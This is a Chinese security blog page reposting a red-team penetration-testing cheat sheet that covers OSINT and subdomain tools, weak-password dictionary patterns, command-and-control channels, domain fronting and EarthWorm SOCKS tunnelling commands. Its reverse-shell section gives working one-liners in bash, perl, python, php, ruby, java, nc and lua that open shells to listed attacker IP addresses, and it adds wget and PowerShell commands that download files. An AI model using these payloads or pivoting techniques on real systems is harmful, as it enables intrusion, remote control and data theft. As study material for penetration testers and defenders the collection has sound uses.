<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>(转)知识点合集 | 网络安全</title><meta name="author" content="Myperfer"><meta name="copyright" content="Myperfer"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Author: Evi1cg Blog: https:&#x2F;&#x2F;evi1cg.github.io 信息搜集开源情报信息收集（OSINT）github Github_Nuggests（自动爬取Github上文件敏感信息泄露） :https:&#x2F;&#x2F;github.com&#x2F;az0ne&#x2F;Github_Nuggests GSIL（能够实现近实时（15分钟内）的发现Github上泄露的信息） :https:&#x2F;&#x2F;git">
<meta property="og:type" content="article">
<meta property="og:title" content="(转)知识点合集">
<meta property="og:url" content="https://myprefer.github.io/post/%E8%BD%AC-%E7%9F%A5%E8%AF%86%E7%82%B9%E5%90%88%E9%9B%86.html">
<meta property="og:site_name" content="网络安全">
<meta property="og:description" content="Author: Evi1cg Blog: https:&#x2F;&#x2F;evi1cg.github.io 信息搜集开源情报信息收集（OSINT）github Github_Nuggests（自动爬取Github上文件敏感信息泄露） :https:&#x2F;&#x2F;github.com&#x2F;az0ne&#x2F;Github_Nuggests GSIL（能够实现近实时（15分钟内）的发现Github上泄露的信息） :https:&#x2F;&#x2F;git">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://myprefer.github.io/img/butterfly-icon.png">
<meta property="article:published_time" content="2024-03-05T15:07:07.000Z">
<meta property="article:modified_time" content="2024-03-11T03:21:52.691Z">
<meta property="article:author" content="Myperfer">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://myprefer.github.io/img/butterfly-icon.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://myprefer.github.io/post/%E8%BD%AC-%E7%9F%A5%E8%AF%86%E7%82%B9%E5%90%88%E9%9B%86.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: undefined,
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '(转)知识点合集',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  isShuoshuo: false
}</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="网络安全" type="application/atom+xml">
</head><body><div id="loading-box"><div class="triangles-wrap"><div class="triangles-eiz"></div><div class="triangles-seiz"></div><div class="triangles-sei"></div><div class="triangles-fei"></div><div class="triangles-feir"></div><div class="triangles-trei"></div><div class="triangles-dvai"></div><div class="triangles-ein"></div><div class="triangles-zero"></div></div></div><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load', preloader.endLoading)

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">网络安全</span></a><a class="nav-page-title" href="/"><span class="site-name">(转)知识点合集</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">(转)知识点合集</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-03-05T15:07:07.000Z" title="Created 2024-03-05 23:07:07">2024-03-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-03-11T03:21:52.691Z" title="Updated 2024-03-11 11:21:52">2024-03-11</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p> Author: <a target="_blank" rel="noopener" href="https://twitter.com/Evi1cg">Evi1cg</a><br> Blog: <a target="_blank" rel="noopener" href="https://evi1cg.github.io/">https://evi1cg.github.io</a></p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="开源情报信息收集（OSINT）"><a href="#开源情报信息收集（OSINT）" class="headerlink" title="开源情报信息收集（OSINT）"></a>开源情报信息收集（OSINT）</h3><h4 id="github"><a href="#github" class="headerlink" title="github"></a>github</h4><ul>
<li>Github_Nuggests（自动爬取Github上文件敏感信息泄露） :<a target="_blank" rel="noopener" href="https://github.com/az0ne/Github_Nuggests">https://github.com/az0ne/Github_Nuggests</a></li>
<li>GSIL（能够实现近实时（15分钟内）的发现Github上泄露的信息） :<a target="_blank" rel="noopener" href="https://github.com/FeeiCN/GSIL">https://github.com/FeeiCN/GSIL</a></li>
<li>x-patrol(小米团队的):<a target="_blank" rel="noopener" href="https://github.com/MiSecurity/x-patrol">https://github.com/MiSecurity/x-patrol</a></li>
</ul>
<h4 id="whois查询-注册人反查-邮箱反查-相关资产"><a href="#whois查询-注册人反查-邮箱反查-相关资产" class="headerlink" title="whois查询&#x2F;注册人反查&#x2F;邮箱反查&#x2F;相关资产"></a>whois查询&#x2F;注册人反查&#x2F;邮箱反查&#x2F;相关资产</h4><ul>
<li>站长之家:<a target="_blank" rel="noopener" href="http://whois.chinaz.com/?DomainName=target.com&ws=">http://whois.chinaz.com/?DomainName=target.com&amp;ws=</a></li>
<li>爱站:<a target="_blank" rel="noopener" href="https://whois.aizhan.com/target.com/">https://whois.aizhan.com/target.com/</a></li>
<li>微步在线:<a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li>
<li>IP反查:<a target="_blank" rel="noopener" href="https://dns.aizhan.com/">https://dns.aizhan.com/</a></li>
<li>天眼查:<a target="_blank" rel="noopener" href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></li>
<li>虎妈查:<a target="_blank" rel="noopener" href="http://www.whomx.com/">http://www.whomx.com/</a></li>
<li>历史漏洞查询 :<ul>
<li>在线查询:<a target="_blank" rel="noopener" href="http://wy.zone.ci/">http://wy.zone.ci/</a></li>
<li>自搭建:<a target="_blank" rel="noopener" href="https://github.com/hanc00l/wooyun_public/">https://github.com/hanc00l/wooyun_public/</a></li>
</ul>
</li>
</ul>
<h4 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h4><h3 id="创建企业密码字典"><a href="#创建企业密码字典" class="headerlink" title="创建企业密码字典"></a>创建企业密码字典</h3><h4 id="字典列表"><a href="#字典列表" class="headerlink" title="字典列表"></a>字典列表</h4><ul>
<li>passwordlist:<a target="_blank" rel="noopener" href="https://github.com/lavalamp-/password-lists">https://github.com/lavalamp-/password-lists</a></li>
<li>猪猪侠字典:<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1dFJyedz">https://pan.baidu.com/s/1dFJyedz</a><br><a target="_blank" rel="noopener" href="https://github.com/rootphantomer/Blasting_dictionary">Blasting_dictionary</a>（分享和收集各种字典，包括弱口令，常用密码，目录爆破。数据库爆破，编辑器爆破，后台爆破等） </li>
<li>针对特定的厂商，重点构造厂商相关域名的字典</li>
</ul>
<pre><code>[&#39;%pwd%123&#39;,&#39;%user%123&#39;,&#39;%user%521&#39;,&#39;%user%2017&#39;,&#39;%pwd%321&#39;,&#39;%pwd%521&#39;,&#39;%user%321&#39;,&#39;%pwd%123!&#39;,&#39;%pwd%123!@#&#39;,&#39;%pwd%1234&#39;,&#39;%user%2016&#39;,&#39;%user%123$%^&#39;,&#39;%user%123!@#&#39;,&#39;%pwd%2016&#39;,&#39;%pwd%2017&#39;,&#39;%pwd%1!&#39;,&#39;%pwd%2@&#39;,&#39;%pwd%3#&#39;,&#39;%pwd%123#@!&#39;,&#39;%pwd%12345&#39;,&#39;%pwd%123$%^&#39;,&#39;%pwd%!@#456&#39;,&#39;%pwd%123qwe&#39;,&#39;%pwd%qwe123&#39;,&#39;%pwd%qwe&#39;,&#39;%pwd%123456&#39;,&#39;%user%123#@!&#39;,&#39;%user%!@#456&#39;,&#39;%user%1234&#39;,&#39;%user%12345&#39;,&#39;%user%123456&#39;,&#39;%user%123!&#39;]
</code></pre>
<h4 id="密码生成"><a href="#密码生成" class="headerlink" title="密码生成"></a>密码生成</h4><ul>
<li>GenpAss（中国特色的弱口令生成器: <a target="_blank" rel="noopener" href="https://github.com/RicterZ/genpAss/">https://github.com/RicterZ/genpAss/</a></li>
<li>passmaker（可以自定义规则的密码字典生成器） ：<a target="_blank" rel="noopener" href="https://github.com/bit4woo/passmaker">https://github.com/bit4woo/passmaker</a></li>
<li>pydictor（强大的密码生成器） ：<a target="_blank" rel="noopener" href="https://github.com/LandGrey/pydictor">https://github.com/LandGrey/pydictor</a></li>
</ul>
<h4 id="邮箱列表获取"><a href="#邮箱列表获取" class="headerlink" title="邮箱列表获取"></a>邮箱列表获取</h4><ul>
<li>theHarvester ：<a target="_blank" rel="noopener" href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></li>
<li>获取一个邮箱以后导出通讯录 </li>
<li>LinkedInt :<a target="_blank" rel="noopener" href="https://github.com/mdsecactivebreach/LinkedInt">https://github.com/mdsecactivebreach/LinkedInt</a></li>
<li>Mailget：<a target="_blank" rel="noopener" href="https://github.com/Ridter/Mailget">https://github.com/Ridter/Mailget</a></li>
</ul>
<h4 id="泄露密码查询"><a href="#泄露密码查询" class="headerlink" title="泄露密码查询"></a>泄露密码查询</h4><ul>
<li>ghostproject: <a target="_blank" rel="noopener" href="https://ghostproject.fr/">https://ghostproject.fr/</a></li>
<li>pwndb: <a target="_blank" rel="noopener" href="https://pwndb2am4tzkvold.onion.to/">https://pwndb2am4tzkvold.onion.to/</a></li>
</ul>
<h4 id="对企业外部相关信息进行搜集"><a href="#对企业外部相关信息进行搜集" class="headerlink" title="对企业外部相关信息进行搜集"></a>对企业外部相关信息进行搜集</h4><h5 id="子域名获取"><a href="#子域名获取" class="headerlink" title="子域名获取"></a>子域名获取</h5><ul>
<li>Layer子域名挖掘机4.2纪念版 </li>
<li>subDomainsBrute ：<a target="_blank" rel="noopener" href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li>
<li>wydomain ：<a target="_blank" rel="noopener" href="https://github.com/ring04h/wydomain">https://github.com/ring04h/wydomain</a></li>
<li>Sublist3r ：<a target="_blank" rel="noopener" href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></li>
<li>企查查：<a target="_blank" rel="noopener" href="https://www.qcc.com/">https://www.qcc.com/</a></li>
<li>天眼查：<a target="_blank" rel="noopener" href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></li>
<li>site:target.com:<a target="_blank" rel="noopener" href="https://www.google.com/">https://www.google.com</a></li>
<li>Github代码仓库 </li>
<li>抓包分析请求返回值(跳转&#x2F;文件上传&#x2F;app&#x2F;api接口等) </li>
<li>站长帮手links等在线查询网站 </li>
<li>域传送漏洞</li>
</ul>
<blockquote>
<p>Linux</p>
</blockquote>
<pre><code>dig @ns.example.com example=.com AXFR 
</code></pre>
<p>Windows</p>
<pre><code>nslookup -type=ns xxx.yyy.cn #查询解析某域名的DNS服务器
nslookup #进入nslookup交互模式
server dns.domian.com #指定dns服务器
ls xxx.yyy.cn #列出域信息
</code></pre>
<ul>
<li>GetDomainsBySSL.py :<a target="_blank" rel="noopener" href="https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a&type=note#/">https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a&amp;type=note#/</a></li>
<li>censys.io证书 :<a target="_blank" rel="noopener" href="https://censys.io/certificates?q=target.com">https://censys.io/certificates?q=target.com</a></li>
<li>crt.sh证书查询:<a target="_blank" rel="noopener" href="https://crt.sh/?q=%25.target.com">https://crt.sh/?q=%25.target.com</a></li>
<li>shadon :<a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io/</a></li>
<li>zoomeye :<a target="_blank" rel="noopener" href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></li>
<li>fofa :<a target="_blank" rel="noopener" href="https://fofa.so/">https://fofa.so/</a></li>
<li>censys：<a target="_blank" rel="noopener" href="https://censys.io/">https://censys.io/</a></li>
<li>dnsdb.io :<a target="_blank" rel="noopener" href="https://dnsdb.io/zh-cn/search?q=target.com">https://dnsdb.io/zh-cn/search?q=target.com</a></li>
<li>api.hackertarget.com :<a target="_blank" rel="noopener" href="http://api.hackertarget.com/reversedns/?q=target.com">http://api.hackertarget.com/reversedns/?q=target.com</a></li>
<li>community.riskiq.com :<a target="_blank" rel="noopener" href="https://community.riskiq.com/Search/target.com">https://community.riskiq.com/Search/target.com</a></li>
<li>subdomain3 :<a target="_blank" rel="noopener" href="https://github.com/yanxiu0614/subdomain3">https://github.com/yanxiu0614/subdomain3</a></li>
<li>FuzzDomain :<a target="_blank" rel="noopener" href="https://github.com/Chora10/FuzzDomain">https://github.com/Chora10/FuzzDomain</a></li>
<li>dnsdumpster.com :<a target="_blank" rel="noopener" href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></li>
<li>phpinfo.me :<a target="_blank" rel="noopener" href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></li>
<li>dns开放数据接口 :<a target="_blank" rel="noopener" href="https://dns.bufferover.run/dns?q=baidu.com">https://dns.bufferover.run/dns?q=baidu.com</a></li>
</ul>
<h2 id="进入内网"><a href="#进入内网" class="headerlink" title="进入内网"></a>进入内网</h2><h3 id="基于企业弱账号漏洞"><a href="#基于企业弱账号漏洞" class="headerlink" title="基于企业弱账号漏洞"></a>基于企业弱账号漏洞</h3><ul>
<li>VPN（通过邮箱，密码爆破，社工等途径获取VPN） </li>
<li>企业相关运维系统（zabbix等）</li>
</ul>
<h3 id="基于系统漏洞进入"><a href="#基于系统漏洞进入" class="headerlink" title="基于系统漏洞进入"></a>基于系统漏洞进入</h3><ul>
<li>Metasploit(漏洞利用框架):<a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a> </li>
<li>漏洞利用脚本</li>
</ul>
<h3 id="网站应用程序渗透"><a href="#网站应用程序渗透" class="headerlink" title="网站应用程序渗透"></a>网站应用程序渗透</h3><ul>
<li>SQL注入 </li>
<li>跨站脚本（XSS） </li>
<li>跨站请求伪造（CSRF） </li>
<li>SSRF（<a target="_blank" rel="noopener" href="https://github.com/bcoles/ssrf_proxy">ssrf_proxy</a>） </li>
<li>功能&#x2F;业务逻辑漏洞 </li>
<li>其他漏洞等 </li>
<li>CMS-内容管理系统漏洞 </li>
<li>企业自建代理</li>
</ul>
<h3 id="无线Wi-Fi接入"><a href="#无线Wi-Fi接入" class="headerlink" title="无线Wi-Fi接入"></a>无线Wi-Fi接入</h3><h2 id="隐匿攻击"><a href="#隐匿攻击" class="headerlink" title="隐匿攻击"></a>隐匿攻击</h2><h3 id="Command-and-Control"><a href="#Command-and-Control" class="headerlink" title="Command and Control"></a>Command and Control</h3><ul>
<li>ICMP :<a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/07/28/command-and-control-icmp/">https://pentestlab.blog/2017/07/28/command-and-control-icmp/</a></li>
<li>DNS :<a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/09/06/command-and-control-dns/">https://pentestlab.blog/2017/09/06/command-and-control-dns/</a></li>
<li>DropBox :<a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/08/29/command-and-control-dropbox/">https://pentestlab.blog/2017/08/29/command-and-control-dropbox/</a></li>
<li>Gmail :<a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/08/03/command-and-control-gmail/">https://pentestlab.blog/2017/08/03/command-and-control-gmail/</a></li>
<li>Telegram :<a target="_blank" rel="noopener" href="http://drops.xmd5.com/static/drops/tips-16142.html">http://drops.xmd5.com/static/drops/tips-16142.html</a></li>
<li>Twitter :<a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/09/26/command-and-control-twitter/">https://pentestlab.blog/2017/09/26/command-and-control-twitter/</a></li>
<li>Website Keyword :<a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/09/14/command-and-control-website-keyword/">https://pentestlab.blog/2017/09/14/command-and-control-website-keyword/</a></li>
<li>PowerShell :<a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/08/19/command-and-control-powershell/">https://pentestlab.blog/2017/08/19/command-and-control-powershell/</a></li>
<li>Windows COM :<a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/09/01/command-and-control-windows-com/">https://pentestlab.blog/2017/09/01/command-and-control-windows-com/</a></li>
<li>WebDAV :<a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/09/12/command-and-control-webdav/">https://pentestlab.blog/2017/09/12/command-and-control-webdav/</a></li>
<li>Office 365 :<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86974">https://www.anquanke.com/post/id/86974</a></li>
<li>HTTPS :<a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/10/04/command-and-control-https/">https://pentestlab.blog/2017/10/04/command-and-control-https/</a></li>
<li>Kernel :<a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/10/02/command-and-control-kernel/">https://pentestlab.blog/2017/10/02/command-and-control-kernel/</a></li>
<li>Website :<a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/11/14/command-and-control-website/">https://pentestlab.blog/2017/11/14/command-and-control-website/</a></li>
<li>WMI :<a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/11/20/command-and-control-wmi/">https://pentestlab.blog/2017/11/20/command-and-control-wmi/</a></li>
<li>WebSocket :<a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/12/06/command-and-control-websocket/">https://pentestlab.blog/2017/12/06/command-and-control-websocket/</a></li>
<li>Images :<a target="_blank" rel="noopener" href="https://pentestlab.blog/2018/01/02/command-and-control-images/">https://pentestlab.blog/2018/01/02/command-and-control-images/</a></li>
<li>Web Interface :<a target="_blank" rel="noopener" href="https://pentestlab.blog/2018/01/03/command-and-control-web-interface/">https://pentestlab.blog/2018/01/03/command-and-control-web-interface/</a></li>
<li>JavaScript :<a target="_blank" rel="noopener" href="https://pentestlab.blog/2018/01/08/command-and-control-javascript/">https://pentestlab.blog/2018/01/08/command-and-control-javascript/</a></li>
<li>…</li>
</ul>
<h3 id="Fronting"><a href="#Fronting" class="headerlink" title="Fronting"></a>Fronting</h3><ul>
<li><a target="_blank" rel="noopener" href="https://evi1cg.me/archives/Domain_Fronting.html">Domain Fronting </a></li>
<li><a target="_blank" rel="noopener" href="https://evi1cg.me/archives/Tor_Fronting.html">Tor_Fronting.</a></li>
</ul>
<h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><ul>
<li>VPN </li>
<li>shadowsockts :<a target="_blank" rel="noopener" href="https://github.com/shadowsocks">https://github.com/shadowsocks</a></li>
<li>HTTP :<a target="_blank" rel="noopener" href="http://cn-proxy.com/">http://cn-proxy.com/</a></li>
<li>Tor</li>
</ul>
<h2 id="内网跨边界应用"><a href="#内网跨边界应用" class="headerlink" title="内网跨边界应用"></a>内网跨边界应用</h2><h3 id="内网跨边界转发"><a href="#内网跨边界转发" class="headerlink" title="内网跨边界转发"></a>内网跨边界转发</h3><ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/l_f0rm4t3d/article/details/24004555">NC端口转发</a> </li>
<li><a target="_blank" rel="noopener" href="http://blog.chinaunix.net/uid-53401-id-4407931.html">LCX端口转发 </a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/cnlh/nps">nps</a> -&gt; 个人用觉得比较稳定 ～</li>
<li><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">frp</a></li>
<li>代理脚本 <ol>
<li><a target="_blank" rel="noopener" href="https://github.com/SECFORCE/Tunna">Tunna </a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/sensepost/reDuh">Reduh </a></li>
</ol>
</li>
<li>…</li>
</ul>
<h3 id="内网跨边界代理穿透"><a href="#内网跨边界代理穿透" class="headerlink" title="内网跨边界代理穿透"></a>内网跨边界代理穿透</h3><h4 id="EW"><a href="#EW" class="headerlink" title="EW"></a><a target="_blank" rel="noopener" href="https://rootkiter.com/EarthWorm/">EW</a></h4><p>正向 SOCKS v5 服务器:</p>
<pre><code>./ew -s ssocksd -l 1080
</code></pre>
<p> 反弹 SOCKS v5 服务器:<br>a) 先在一台具有公网 ip 的主机A上运行以下命令：</p>
<pre><code>$ ./ew -s rcsocks -l 1080 -e 8888 
</code></pre>
<p>b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口</p>
<pre><code>$ ./ew -s rssocks -d 1.1.1.1 -e 8888 
</code></pre>
<p>多级级联</p>
<pre><code>$ ./ew -s lcx_listen -l 1080 -e 8888
$ ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999
$ ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999
</code></pre>
<p>lcx_tran 的用法</p>
<pre><code>$ ./ew -s ssocksd -l 9999
$ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999
</code></pre>
<p>lcx_listen、lcx_slave 的用法</p>
<pre><code>$ ./ew -s lcx_listen -l 1080 -e 8888
$ ./ew -s ssocksd -l 9999
$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
</code></pre>
<p>“三级级联”的本地SOCKS测试用例以供参考</p>
<pre><code>$ ./ew -s rcsocks -l 1080 -e 8888
$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
$ ./ew -s lcx_listen -l 9999 -e 7777
$ ./ew -s rssocks -d 127.0.0.1 -e 7777
</code></pre>
<h4 id="Termite"><a href="#Termite" class="headerlink" title="Termite"></a><a target="_blank" rel="noopener" href="https://rootkiter.com/Termite/">Termite</a></h4><p>使用说明:<a target="_blank" rel="noopener" href="https://rootkiter.com/Termite/README.txt">https://rootkiter.com/Termite/README.txt</a> </p>
<h4 id="代理脚本"><a href="#代理脚本" class="headerlink" title="代理脚本"></a>代理脚本</h4><p>reGeorg :<a target="_blank" rel="noopener" href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a><br>Neo-reGeorg:<a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a><br>pystinger(毒刺):<a target="_blank" rel="noopener" href="https://github.com/FunnyWolf/pystinger">https://github.com/FunnyWolf/pystinger</a><br>ABPTTS:<a target="_blank" rel="noopener" href="https://github.com/nccgroup/ABPTTS">https://github.com/nccgroup/ABPTTS</a></p>
<h3 id="shell反弹"><a href="#shell反弹" class="headerlink" title="shell反弹"></a>shell反弹</h3><p>bash  </p>
<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
</code></pre>
<p>perl </p>
<pre><code>perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;
</code></pre>
<p>python </p>
<pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
</code></pre>
<p>php </p>
<pre><code>php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
</code></pre>
<p>ruby </p>
<pre><code>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;
</code></pre>
<p>java </p>
<pre><code>r = Runtime.getRuntime()
p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
p.waitFor()
</code></pre>
<p>nc </p>
<pre><code>#使用-e 
nc -e /bin/sh 223.8.200.234 1234 
</code></pre>
<pre><code>#不使用-e
mknod /tmp/backpipe p
/bin/sh 0/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe
</code></pre>
<p>lua </p>
<pre><code>lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;202.103.243.122&#39;,&#39;1234&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;
</code></pre>
<h3 id="内网文件的传输和下载"><a href="#内网文件的传输和下载" class="headerlink" title="内网文件的传输和下载"></a>内网文件的传输和下载</h3><p>wput </p>
<pre><code>wput dir_name ftp://linuxpig:123456@host.com/
</code></pre>
<p>wget </p>
<pre><code>wget http://site.com/1.rar -O 1.rar
</code></pre>
<p>ariac2（需安装） </p>
<pre><code>aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2
</code></pre>
<p>powershell</p>
<pre><code>$p = New-Object System.Net.WebClient 
$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;) 
</code></pre>
